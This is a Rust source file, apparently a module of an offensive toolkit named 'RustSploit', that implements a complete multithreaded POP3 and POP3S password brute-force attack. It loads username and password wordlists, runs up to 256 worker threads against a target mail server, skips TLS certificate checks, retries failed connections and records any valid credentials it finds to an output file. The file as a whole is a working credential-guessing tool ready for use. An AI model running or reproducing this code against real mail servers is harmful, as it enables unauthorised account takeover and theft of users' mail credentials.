use anyhow::{anyhow, Context, Result};
use colored::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::Path;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc, Mutex,
};
use std::time::{Duration, Instant};
use threadpool::ThreadPool;
use crossbeam_channel::unbounded;
use native_tls::TlsConnector;

// Const for compile-time constants
const MAX_RETRIES_LIMIT: usize = 10;
const MAX_THREADS: usize = 256;
const MAX_DELAY_MS: u64 = 10000;
const TIMEOUT_MIN: u64 = 1;
const TIMEOUT_MAX: u64 = 60;
const BUFFER_SIZE: usize = 8192;
const PROGRESS_INTERVAL_SECS: u64 = 2;
const MAX_MEMORY_SIZE: u64 = 500 * 1024 * 1024; // 500 MB

#[derive(Clone, Serialize, Deserialize)]
struct Pop3BruteforceConfig {
    #[serde(skip)]
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: String,
    threads: usize,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    use_ssl: bool,
    connection_timeout: u64,
    read_timeout: u64,
    retry_on_error: bool,
    max_retries: usize,
    output_file: String,
    append_mode: bool,
    delay_ms: u64,
}

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    retried_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    #[inline]
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            retried_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    #[inline]
    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    #[inline]
    fn record_retry(&self) {
        self.retried_attempts.fetch_add(1, Ordering::Relaxed);
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {} retry | {:.1}/s    ",
            "[Progress]".cyan(),
               total.to_string().bold(),
               success.to_string().green(),
               failed,
               errors.to_string().red(),
               retries,
               rate
        );
        let _ = std::io::stdout().flush();
    }

    fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        println!("\n{}", "[Final Statistics]".bold().cyan());
        println!("  Total attempts:  {}", total.to_string().bold());
        println!("  Successful:      {}", success.to_string().green().bold());
        println!("  Failed:          {}", failed);
        println!("  Errors:          {}", errors.to_string().yellow());
        println!("  Retries:         {}", retries);
        println!("  Time elapsed:    {:.2}s", elapsed);
        println!("  Average rate:    {:.2} attempts/sec", rate);
        if success > 0 {
            let success_rate = (success as f64 / total as f64) * 100.0;
            println!("  Success rate:    {:.2}%", success_rate);
        }
    }
}

pub async fn run(target: &str) -> Result<()> {
    println!("\n{}", "=== POP3 Bruteforce Module (RustSploit) ===".bold().cyan());
    println!();

    let target = target.trim().to_string();
    let use_config = prompt_yes_no("Do you have a configuration file? (y/n): ", false);

    let config = if use_config {
        load_config_from_file(&target).await?
    } else {
        build_interactive_config(&target).await?
    };

    print_config_summary(&config);

    if !prompt_yes_no("\nProceed with this configuration? (y/n): ", true) {
        println!("[*] Aborted by user.");
        return Ok(());
    }

    if !use_config && prompt_yes_no("\nSave this configuration? (y/n): ", false) {
        save_configuration(&config)?;
    }

    println!();
    println!("{}", "[Starting Attack]".bold().yellow());
    println!();

    run_pop3_bruteforce(config)
}

async fn load_config_from_file(target: &str) -> Result<Pop3BruteforceConfig> {
    println!();
    print_config_format();
    println!();

    let config_path = prompt_wordlist("Path to configuration file: ")?;
    println!("[*] Loading configuration from '{}'...", config_path);

    match load_and_validate_config(&config_path, target).await {
        Ok(cfg) => {
            println!("{}", "[+] Configuration loaded successfully!".green().bold());
            Ok(cfg)
        }
        Err(e) => {
            eprintln!("{}", "[!] Configuration validation failed:".red().bold());
            eprintln!("{}", format!("    {}", e).yellow());
            Err(e)
        }
    }
}

async fn build_interactive_config(target: &str) -> Result<Pop3BruteforceConfig> {
    println!("{}", "[Interactive Configuration Mode]".bold().green());
    println!();

    let use_ssl = prompt_yes_no("Use SSL/TLS (POP3S)? (y/n): ", false);
    let default_port = if use_ssl { 995 } else { 110 };
    let port = prompt_port(default_port);
    let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
    let password_wordlist = prompt_wordlist("Password wordlist file: ")?;
    let threads = prompt_threads(16);
    let delay_ms = prompt_delay(50);
    let connection_timeout = prompt_timeout("Connection timeout (seconds, default 4): ", 4);
    let read_timeout = prompt_timeout("Read timeout (seconds, default 4): ", 4);
    let full_combo = prompt_yes_no("Try every username with every password? (y/n): ", false);
    let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false);
    let output_file = prompt_required("Output file for results: ");
    let append_mode = if Path::new(&output_file).exists() {
        prompt_yes_no(&format!("File '{}' exists. Append? (y/n): ", output_file), true)
    } else {
        false
    };
    let verbose = prompt_yes_no("Verbose mode? (y/n): ", false);
    let retry_on_error = prompt_yes_no("Retry failed connections? (y/n): ", true);
    let max_retries = if retry_on_error { prompt_retries(2) } else { 0 };

    Ok(Pop3BruteforceConfig {
        target: target.to_string(),
       port,
       username_wordlist,
       password_wordlist,
       threads,
       stop_on_success,
       verbose,
       full_combo,
       use_ssl,
       connection_timeout,
       read_timeout,
       retry_on_error,
       max_retries,
       output_file,
       append_mode,
       delay_ms,
    })
}

fn save_configuration(config: &Pop3BruteforceConfig) -> Result<()> {
    let save_path = prompt_required("Configuration file path: ");
    if let Err(e) = save_config(config, &save_path) {
        eprintln!("[!] Failed to save config: {}", e);
        Err(e)
    } else {
        println!("[+] Configuration saved to '{}'", save_path);
        Ok(())
    }
}

fn print_config_format() {
    println!("{}", "=== Configuration File Format (JSON) ===".bold().cyan());
    println!("{}", r#"
    {
    "port": 110,
    "username_wordlist": "/path/to/usernames.txt",
    "password_wordlist": "/path/to/passwords.txt",
    "threads": 16,
    "stop_on_success": false,
    "verbose": false,
    "full_combo": false,
    "use_ssl": false,
    "connection_timeout": 4,
    "read_timeout": 4,
    "retry_on_error": true,
    "max_retries": 2,
    "output_file": "pop3_results.txt",
    "append_mode": false,
    "delay_ms": 50
}
"#.bright_black());
    println!("{}", "========================================".cyan());
}

async fn load_and_validate_config(path: &str, target: &str) -> Result<Pop3BruteforceConfig> {
    let content = std::fs::read_to_string(path)
    .context("Failed to read configuration file")?;

    let mut config: Pop3BruteforceConfig = serde_json::from_str(&content)
    .context("Failed to parse JSON configuration")?;

    config.target = target.to_string();

    let mut errors = Vec::with_capacity(16);

    if config.port == 0 {
        errors.push("Port must be greater than 0".to_string());
    }

    if config.threads == 0 {
        errors.push("Threads must be at least 1".to_string());
    }
    if config.threads > MAX_THREADS {
        errors.push(format!("Threads cannot exceed {}", MAX_THREADS));
    }

    if !(TIMEOUT_MIN..=TIMEOUT_MAX).contains(&config.connection_timeout) {
        errors.push(format!("Connection timeout must be {}-{} seconds", TIMEOUT_MIN, TIMEOUT_MAX));
    }
    if !(TIMEOUT_MIN..=TIMEOUT_MAX).contains(&config.read_timeout) {
        errors.push(format!("Read timeout must be {}-{} seconds", TIMEOUT_MIN, TIMEOUT_MAX));
    }

    if config.delay_ms > MAX_DELAY_MS {
        errors.push(format!("Delay cannot exceed {}ms", MAX_DELAY_MS));
    }

    if config.max_retries > MAX_RETRIES_LIMIT {
        errors.push(format!("Max retries cannot exceed {}", MAX_RETRIES_LIMIT));
    }

    validate_wordlist_file(&config.username_wordlist, "Username", &mut errors)?;
    validate_wordlist_file(&config.password_wordlist, "Password", &mut errors)?;

    if config.output_file.is_empty() {
        errors.push("Output file path is required".to_string());
    }

    if !errors.is_empty() {
        return Err(anyhow!("Configuration validation errors:\n    - {}", errors.join("\n    - ")));
    }

    Ok(config)
}

fn validate_wordlist_file(path: &str, label: &str, errors: &mut Vec<String>) -> Result<()> {
    if path.is_empty() {
        errors.push(format!("{} wordlist path is required", label));
        return Ok(());
    }

    if !Path::new(path).is_file() {
        errors.push(format!("{} wordlist '{}' does not exist", label, path));
        return Ok(());
    }

    let count = count_nonempty_lines(path)?;
    if count == 0 {
        errors.push(format!("{} wordlist '{}' is empty", label, path));
    }

    Ok(())
}

fn save_config(config: &Pop3BruteforceConfig, path: &str) -> Result<()> {
    let json = serde_json::to_string_pretty(config)
    .context("Failed to serialize configuration")?;

    std::fs::write(path, json)
    .context("Failed to write configuration file")?;

    Ok(())
}

fn print_config_summary(config: &Pop3BruteforceConfig) {
    println!("\n{}", "=== Configuration Summary ===".bold().cyan());
    println!("  Target:              {}:{}", config.target, config.port);
    println!("  Protocol:            {}", if config.use_ssl { "POP3S (SSL/TLS)" } else { "POP3 (Plain)" });
    println!("  Username wordlist:   {}", config.username_wordlist);
    println!("  Password wordlist:   {}", config.password_wordlist);
    println!("  Threads:             {}", config.threads);
    println!("  Delay:               {}ms", config.delay_ms);
    println!("  Connection timeout:  {}s", config.connection_timeout);
    println!("  Read timeout:        {}s", config.read_timeout);
    println!("  Full combo mode:     {}", if config.full_combo { "Yes" } else { "No" });
    println!("  Stop on success:     {}", if config.stop_on_success { "Yes" } else { "No" });
    println!("  Output file:         {} ({})",
             config.output_file,
             if config.append_mode { "append" } else { "overwrite" });
    println!("  Retry on error:      {}", if config.retry_on_error {
        format!("Yes (max {} retries)", config.max_retries)
    } else {
        "No".to_string()
    });
    println!("  Verbose:             {}", if config.verbose { "Yes" } else { "No" });
    println!("{}", "=============================".cyan());
}

fn run_pop3_bruteforce(config: Pop3BruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port)?;
    let host = get_hostname(&config.target);

    println!("[*] Target resolved to: {}", addr);

    // Check wordlist sizes
    let username_size = std::fs::metadata(&config.username_wordlist)?.len();
    let password_size = std::fs::metadata(&config.password_wordlist)?.len();
    let total_size = username_size + password_size;

    // Determine loading strategy
    let use_streaming = if total_size > MAX_MEMORY_SIZE {
        let size_mb = total_size as f64 / (1024.0 * 1024.0);
        println!();
        println!("{}", format!("[!] Warning: Total wordlist size is {:.1} MB", size_mb).yellow().bold());
        println!("Loading this into memory would consume significant RAM (~{:.0} MB).", size_mb);
        println!();
        println!("You have two options:");
        println!("  1. {} - Load into memory (faster, uses ~{:.0} MB RAM)", "Memory mode".green(), size_mb);
        println!("  2. {} - Stream from disk (slower, minimal memory)", "Streaming mode".cyan());
        println!("  3. {} - Cancel operation", "Abort".red());
        println!();

        loop {
            let choice = prompt("Select option (1/2/3): ");
            match choice.trim() {
                "1" => {
                    println!("[*] Using memory mode...");
                    break false;
                }
                "2" => {
                    println!("[*] Using streaming mode...");
                    break true;
                }
                "3" => {
                    println!();
                    println!("{}", "[*] Operation cancelled by user. Safe exit.".yellow());
                    return Ok(());
                }
                _ => println!("[!] Invalid choice. Please enter 1, 2, or 3."),
            }
        }
    } else {
        false
    };

    let (username_count, password_count) = if use_streaming {
        let user_count = count_nonempty_lines(&config.username_wordlist)?;
        let pass_count = count_nonempty_lines(&config.password_wordlist)?;

        if user_count == 0 {
            return Err(anyhow!("Username wordlist is empty"));
        }
        if pass_count == 0 {
            return Err(anyhow!("Password wordlist is empty"));
        }

        println!("[*] Counted {} username(s)", user_count);
        println!("[*] Counted {} password(s)", pass_count);

        (user_count, pass_count)
    } else {
        let (usernames, passwords) = load_wordlists_parallel(&config)?;

        if usernames.is_empty() {
            return Err(anyhow!("Username wordlist is empty"));
        }
        if passwords.is_empty() {
            return Err(anyhow!("Password wordlist is empty"));
        }

        println!("[*] Loaded {} username(s)", usernames.len());
        println!("[*] Loaded {} password(s)", passwords.len());

        (usernames.len(), passwords.len())
    };

    let estimated_total = calculate_estimated_attempts(&config, username_count, password_count);
    println!("[*] Estimated total attempts: {}", estimated_total);
    println!();

    initialize_output_file(&config)?;

    let found = Arc::new(Mutex::new(HashSet::new()));
    let unknown = Arc::new(Mutex::new(Vec::<(String, String, String)>::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());
    let output_file = Arc::new(config.output_file.clone());

    let pool = ThreadPool::new(config.threads);
    let (tx, rx) = unbounded();

    if use_streaming {
        let config_clone = config.clone();
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();

        std::thread::spawn(move || {
            if let Err(e) = stream_combinations(&config_clone, tx_clone, stop_clone) {
                eprintln!("[!] Streaming producer error: {}", e);
            }
        });
    } else {
        let usernames = read_lines(&config.username_wordlist)?;
        let passwords = read_lines(&config.password_wordlist)?;
        enqueue_combinations(&config, &usernames, &passwords, &tx);
    }

    drop(tx);

    spawn_progress_reporter(stats.clone(), stop_flag.clone());

    spawn_workers(
        &pool,
        &config,
        rx,
        addr,
        host,
        stop_flag.clone(),
                  found.clone(),
        unknown.clone(),
                  output_file,
                  stats.clone(),
    );

    pool.join();
    stop_flag.store(true, Ordering::Relaxed);

    stats.print_final();
    print_final_report(&found, &unknown, &config.output_file);

    Ok(())
}

fn stream_combinations(
    config: &Pop3BruteforceConfig,
    tx: crossbeam_channel::Sender<(String, String)>,
                       stop_flag: Arc<AtomicBool>,
) -> Result<()> {
    if config.full_combo {
        let user_file = File::open(&config.username_wordlist)?;
        let user_reader = BufReader::new(user_file);

        for user_line in user_reader.lines() {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }

            let user = match user_line {
                Ok(line) => {
                    let trimmed = line.trim();
                    if trimmed.is_empty() {
                        continue;
                    }
                    trimmed.to_string()
                }
                Err(_) => continue,
            };

            let pass_file = File::open(&config.password_wordlist)?;
            let pass_reader = BufReader::new(pass_file);

            for pass_line in pass_reader.lines() {
                if stop_flag.load(Ordering::Relaxed) {
                    break;
                }

                let pass = match pass_line {
                    Ok(line) => {
                        let trimmed = line.trim();
                        if trimmed.is_empty() {
                            continue;
                        }
                        trimmed.to_string()
                    }
                    Err(_) => continue,
                };

                if tx.send((user.clone(), pass)).is_err() {
                    return Ok(());
                }
            }
        }
    } else {
        let user_file = File::open(&config.username_wordlist)?;
        let pass_file = File::open(&config.password_wordlist)?;

        let mut user_reader = BufReader::new(user_file);
        let pass_reader = BufReader::new(pass_file);

        let mut first_user = String::new();
        for line in user_reader.by_ref().lines() {
            if let Ok(user_line) = line {
                let trimmed = user_line.trim();
                if !trimmed.is_empty() {
                    first_user = trimmed.to_string();
                    break;
                }
            }
        }

        if first_user.is_empty() {
            return Err(anyhow!("No valid usernames found"));
        }

        for pass_line in pass_reader.lines() {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }

            let pass = match pass_line {
                Ok(line) => {
                    let trimmed = line.trim();
                    if trimmed.is_empty() {
                        continue;
                    }
                    trimmed.to_string()
                }
                Err(_) => continue,
            };

            if tx.send((first_user.clone(), pass)).is_err() {
                return Ok(());
            }
        }
    }

    Ok(())
}

fn load_wordlists_parallel(config: &Pop3BruteforceConfig) -> Result<(Vec<String>, Vec<String>)> {
    use std::thread;

    let username_path = config.username_wordlist.clone();
    let password_path = config.password_wordlist.clone();

    let username_handle = thread::spawn(move || read_lines(&username_path));
    let password_handle = thread::spawn(move || read_lines(&password_path));

    let usernames = username_handle.join()
    .map_err(|_| anyhow!("Username loading thread panicked"))??;
    let passwords = password_handle.join()
    .map_err(|_| anyhow!("Password loading thread panicked"))??;

    Ok((usernames, passwords))
}

#[inline]
fn calculate_estimated_attempts(config: &Pop3BruteforceConfig, user_count: usize, pass_count: usize) -> usize {
    if config.full_combo {
        user_count * pass_count
    } else if user_count == 1 {
        pass_count
    } else if pass_count == 1 {
        user_count
    } else {
        pass_count
    }
}

fn initialize_output_file(config: &Pop3BruteforceConfig) -> Result<()> {
    if !config.append_mode {
        let mut f = File::create(&config.output_file)?;
        writeln!(f, "# POP3 Bruteforce Results - {}", chrono::Local::now())?;
        writeln!(f, "# Target: {}:{}", config.target, config.port)?;
        writeln!(f, "# Format: username:password\n")?;
    }
    Ok(())
}

fn enqueue_combinations(
    config: &Pop3BruteforceConfig,
    usernames: &[String],
    passwords: &[String],
    tx: &crossbeam_channel::Sender<(String, String)>,
) {
    if config.full_combo {
        for u in usernames {
            for p in passwords {
                let _ = tx.send((u.clone(), p.clone()));
            }
        }
    } else if usernames.len() == 1 {
        for p in passwords {
            let _ = tx.send((usernames[0].clone(), p.clone()));
        }
    } else if passwords.len() == 1 {
        for u in usernames {
            let _ = tx.send((u.clone(), passwords[0].clone()));
        }
    } else {
        for p in passwords {
            let _ = tx.send((usernames[0].clone(), p.clone()));
        }
    }
}

fn spawn_progress_reporter(stats: Arc<Statistics>, stop_flag: Arc<AtomicBool>) {
    std::thread::spawn(move || {
        while !stop_flag.load(Ordering::Relaxed) {
            std::thread::sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS));
            stats.print_progress();
        }
    });
}

fn spawn_workers(
    pool: &ThreadPool,
    config: &Pop3BruteforceConfig,
    rx: crossbeam_channel::Receiver<(String, String)>,
                 addr: String,
                 host: String,
                 stop_flag: Arc<AtomicBool>,
                 found: Arc<Mutex<HashSet<(String, String)>>>,
                 unknown: Arc<Mutex<Vec<(String, String, String)>>>,
                 output_file: Arc<String>,
                 stats: Arc<Statistics>,
) {
    for worker_id in 0..config.threads {
        let rx = rx.clone();
        let addr = addr.clone();
        let host = host.clone();
        let stop_flag = stop_flag.clone();
        let found = found.clone();
        let unknown = unknown.clone();
        let output_file = output_file.clone();
        let stats = stats.clone();
        let config = config.clone();

        pool.execute(move || {
            worker_loop(
                worker_id,
                rx,
                &addr,
                &host,
                &config,
                &stop_flag,
                &found,
                &unknown,
                &output_file,
                &stats,
            );
        });
    }
}

fn worker_loop(
    worker_id: usize,
    rx: crossbeam_channel::Receiver<(String, String)>,
               addr: &str,
               host: &str,
               config: &Pop3BruteforceConfig,
               stop_flag: &Arc<AtomicBool>,
               found: &Arc<Mutex<HashSet<(String, String)>>>,
               unknown: &Arc<Mutex<Vec<(String, String, String)>>>,
               output_file: &str,
               stats: &Arc<Statistics>,
) {
    while let Ok((user, pass)) = rx.recv() {
        if stop_flag.load(Ordering::Relaxed) {
            break;
        }

        if config.verbose {
            println!(
                "{} [Worker {}] Trying {}:{}",
                "[*]".bright_blue(),
                     worker_id,
                     user,
                     pass
            );
        }

        let result = attempt_login_with_retry(addr, host, &user, &pass, config, stats);

        process_login_result(
            result,
            &user,
            &pass,
            config,
            stop_flag,
            found,
            unknown,
            output_file,
            stats,
            &rx,
        );

        if config.delay_ms > 0 {
            std::thread::sleep(Duration::from_millis(config.delay_ms));
        }
    }
}

fn attempt_login_with_retry(
    addr: &str,
    host: &str,
    user: &str,
    pass: &str,
    config: &Pop3BruteforceConfig,
    stats: &Arc<Statistics>,
) -> Result<bool> {
    let mut result = if config.use_ssl {
        try_pop3s_login(addr, host, user, pass, config)
    } else {
        try_pop3_login(addr, user, pass, config)
    };

    let mut retry_count = 0;
    while config.retry_on_error && retry_count < config.max_retries {
        if result.is_err() {
            retry_count += 1;
            stats.record_retry();
            std::thread::sleep(Duration::from_millis(config.delay_ms * 2));
            result = if config.use_ssl {
                try_pop3s_login(addr, host, user, pass, config)
            } else {
                try_pop3_login(addr, user, pass, config)
            };
        } else {
            break;
        }
    }

    result
}

fn process_login_result(
    result: Result<bool>,
    user: &str,
    pass: &str,
    config: &Pop3BruteforceConfig,
    stop_flag: &Arc<AtomicBool>,
    found: &Arc<Mutex<HashSet<(String, String)>>>,
    unknown: &Arc<Mutex<Vec<(String, String, String)>>>,
                        output_file: &str,
                        stats: &Arc<Statistics>,
                        rx: &crossbeam_channel::Receiver<(String, String)>,
) {
    match result {
        Ok(true) => {
            stats.record_attempt(true, false);

            let mut creds = found.lock().unwrap();
            if creds.insert((user.to_string(), pass.to_string())) {
                drop(creds);

                println!(
                    "\n{}",
                    format!("[+] VALID CREDENTIALS: {}:{}", user, pass).green().bold()
                );

                if let Err(e) = append_result(output_file, user, pass) {
                    eprintln!("[!] Failed to write result: {}", e);
                }

                if config.stop_on_success {
                    stop_flag.store(true, Ordering::Relaxed);
                    while rx.try_recv().is_ok() {}
                }
            }
        }
        Ok(false) => {
            stats.record_attempt(false, false);
            if config.verbose {
                println!("{} Failed: {}:{}", "[-]".red(), user, pass);
            }
        }
        Err(e) => {
            stats.record_attempt(false, true);
            let msg = e.to_string();
            {
                let mut unk = unknown.lock().unwrap();
                unk.push((user.to_string(), pass.to_string(), msg.clone()));
            }
            if config.verbose {
                eprintln!("{} Error/unknown ({}): {}:{}", "[?]".yellow(), msg, user, pass);
            }
        }
    }
}

fn print_final_report(
    found: &Arc<Mutex<HashSet<(String, String)>>>,
    unknown: &Arc<Mutex<Vec<(String, String, String)>>>,
    output_file: &str,
) {
    let found = found.lock().unwrap();
    println!();
    if found.is_empty() {
        println!("{}", "[-] No valid credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} unique credential(s):", found.len()).green().bold());
        let mut sorted: Vec<_> = found.iter().collect();
        sorted.sort();
        for (u, p) in sorted.iter() {
            println!("  {}  {}:{}", "✓".green(), u, p);
        }
        println!("\n[*] All valid results saved to: {}", output_file);
    }

    drop(found);

    let unknown_guard = unknown.lock().unwrap();
    if !unknown_guard.is_empty() {
        println!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored POP3 responses.",
                unknown_guard.len()
            )
            .yellow()
            .bold()
        );
        if prompt_yes_no("Save unknown responses to file? (y/n): ", true) {
            let default_name = "pop3_unknown_responses.txt";
            let fname = prompt_required(&format!(
                "What should the unknown results be saved as? (default: {}): ",
                default_name
            ));
            let chosen = if fname.trim().is_empty() {
                default_name.to_string()
            } else {
                fname.trim().to_string()
            };
            if let Err(e) = save_unknown_pop3(&chosen, &unknown_guard) {
                println!("{}", format!("[!] Failed to save unknown responses: {}", e).red());
            } else {
                println!("{}", format!("[+] Unknown responses saved to {}", chosen).green());
            }
        }
    }
}

#[inline]
fn try_pop3_login(addr: &str, username: &str, password: &str, config: &Pop3BruteforceConfig) -> Result<bool> {
    let socket = addr
    .to_socket_addrs()?
    .next()
    .ok_or_else(|| anyhow!("Could not resolve address"))?;

    let mut stream = TcpStream::connect_timeout(&socket, Duration::from_secs(config.connection_timeout))
    .context("Connection timeout")?;

    stream.set_read_timeout(Some(Duration::from_secs(config.read_timeout)))?;
    stream.set_write_timeout(Some(Duration::from_secs(config.read_timeout)))?;

    pop3_session(&mut stream, username, password, config.verbose)
}

#[inline]
fn try_pop3s_login(addr: &str, host: &str, username: &str, password: &str, config: &Pop3BruteforceConfig) -> Result<bool> {
    let socket = addr
    .to_socket_addrs()?
    .next()
    .ok_or_else(|| anyhow!("Could not resolve address"))?;

    let stream = TcpStream::connect_timeout(&socket, Duration::from_secs(config.connection_timeout))
    .context("Connection timeout")?;

    let connector = TlsConnector::builder()
    .danger_accept_invalid_certs(true)
    .danger_accept_invalid_hostnames(true)
    .build()
    .context("TLS connector build failed")?;

    let mut tls_stream = connector
    .connect(host, stream)
    .context("SSL/TLS connection failed")?;

    tls_stream.get_ref().set_read_timeout(Some(Duration::from_secs(config.read_timeout)))?;
    tls_stream.get_ref().set_write_timeout(Some(Duration::from_secs(config.read_timeout)))?;

    pop3_session(&mut tls_stream, username, password, config.verbose)
}

fn pop3_session<S: Read + Write>(stream: &mut S, username: &str, password: &str, verbose: bool) -> Result<bool> {
    let mut buf = [0u8; BUFFER_SIZE];

    // Read banner
    let n = stream.read(&mut buf).context("Failed to read banner")?;
    if n == 0 {
        return Err(anyhow!("No banner received"));
    }
    let banner = String::from_utf8_lossy(&buf[..n]);
    if verbose {
        println!("-> {}", banner.trim_end());
    }

    if !banner.to_ascii_lowercase().contains("+ok") {
        return Err(anyhow!("No +OK banner: {}", banner.trim()));
    }

    // Send USER command
    let user_cmd = format!("USER {}\r\n", username);
    stream.write_all(user_cmd.as_bytes()).context("Failed to send USER")?;
    if verbose {
        print!("<- {}", user_cmd);
    }

    let n = stream.read(&mut buf).context("Failed to read USER response")?;
    if n == 0 {
        return Err(anyhow!("No USER response"));
    }
    let resp = String::from_utf8_lossy(&buf[..n]);
    if verbose {
        println!("-> {}", resp.trim_end());
    }

    if !resp.to_ascii_lowercase().contains("+ok") {
        return Ok(false);
    }

    // Send PASS command
    let pass_cmd = format!("PASS {}\r\n", password);
    stream.write_all(pass_cmd.as_bytes()).context("Failed to send PASS")?;
    if verbose {
        print!("<- PASS ****\n");
    }

    let n = stream.read(&mut buf).context("Failed to read PASS response")?;
    if n == 0 {
        return Err(anyhow!("No PASS response"));
    }
    let resp = String::from_utf8_lossy(&buf[..n]);
    if verbose {
        println!("-> {}", resp.trim_end());
    }

    // Enhanced login detection with early failure detection
    let reply_lower = resp.to_ascii_lowercase();

    // Check for explicit errors first (more common, faster to fail)
    if reply_lower.contains("-err")
        || reply_lower.contains("error")
        || reply_lower.contains("fail")
        || reply_lower.contains("denied")
        || reply_lower.contains("invalid")
        || reply_lower.contains("authentication required")
        || reply_lower.contains("locked")
        || reply_lower.contains("wrong")
        || reply_lower.contains("incorrect")
        {
            return Ok(false);
        }

        // Check for success indicator
        if reply_lower.contains("+ok") {
            // Send QUIT to clean up
            let _ = stream.write_all(b"QUIT\r\n");
            let _ = stream.read(&mut buf);
            return Ok(true);
        }

        Ok(false)
}

fn append_result(output_file: &str, username: &str, password: &str) -> Result<()> {
    let mut file = OpenOptions::new()
    .create(true)
    .append(true)
    .open(output_file)?;

    writeln!(file, "{}:{}", username, password)?;
    file.flush()?;
    Ok(())
}

fn save_unknown_pop3(path: &str, entries: &[(String, String, String)]) -> Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(path)?;

    writeln!(file, "# POP3 Bruteforce Unknown/Errored Responses")?;
    writeln!(file, "# Format: username:password - error/response")?;
    writeln!(file)?;

    for (user, pass, msg) in entries {
        writeln!(file, "{}:{} - {}", user, pass, msg)?;
    }

    Ok(())
}

fn read_lines(path: &str) -> Result<Vec<String>> {
    let file = File::open(path).with_context(|| format!("Failed to open: {}", path))?;
    Ok(BufReader::new(file)
    .lines()
    .filter_map(Result::ok)
    .filter_map(|s| {
        let trimmed = s.trim();
        (!trimmed.is_empty()).then(|| trimmed.to_string())
    })
    .collect())
}

fn count_nonempty_lines(path: &str) -> Result<usize> {
    let file = File::open(path)?;
    Ok(BufReader::new(file)
    .lines()
    .filter_map(Result::ok)
    .filter(|s| !s.trim().is_empty())
    .count())
}

// ============================================================
// PROMPT FUNCTIONS
// ============================================================

#[inline]
fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();
    buf.trim().to_string()
}

fn prompt_required(msg: &str) -> String {
    loop {
        let input = prompt(msg);
        if !input.trim().is_empty() {
            return input.trim().to_string();
        }
        println!("[!] This field is required.");
    }
}

fn prompt_port(default: u16) -> u16 {
    loop {
        let input = prompt(&format!("Port (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u16>() {
            Ok(port) if port > 0 => return port,
            _ => println!("[!] Invalid port value."),
        }
    }
}

fn prompt_delay(default: u64) -> u64 {
    loop {
        let input = prompt(&format!("Delay between attempts in ms (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if val <= MAX_DELAY_MS => return val,
            _ => println!("[!] Invalid delay (max {}ms).", MAX_DELAY_MS),
        }
    }
}

fn prompt_timeout(msg: &str, default: u64) -> u64 {
    loop {
        let input = prompt(msg);
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if (TIMEOUT_MIN..=TIMEOUT_MAX).contains(&val) => return val,
            _ => println!("[!] Invalid timeout ({}-{} seconds).", TIMEOUT_MIN, TIMEOUT_MAX),
        }
    }
}

fn prompt_threads(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Number of threads (default {}): ", default));
        if input.is_empty() {
            return default.max(1);
        }
        match input.parse::<usize>() {
            Ok(val) if val >= 1 && val <= MAX_THREADS => return val,
            _ => println!("[!] Invalid thread count (1-{}).", MAX_THREADS),
        }
    }
}

fn prompt_retries(default: usize) -> usize {
    loop {
        let input = prompt(&format!("Max retries per attempt (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<usize>() {
            Ok(val) if val <= MAX_RETRIES_LIMIT => return val,
            _ => println!("[!] Invalid retry count (max {}).", MAX_RETRIES_LIMIT),
        }
    }
}

fn prompt_yes_no(message: &str, default: bool) -> bool {
    loop {
        let input = prompt(message);
        if input.is_empty() {
            return default;
        }
        match input.to_lowercase().as_str() {
            "y" | "yes" => return true,
            "n" | "no" => return false,
            _ => println!("[!] Please respond with y or n."),
        }
    }
}

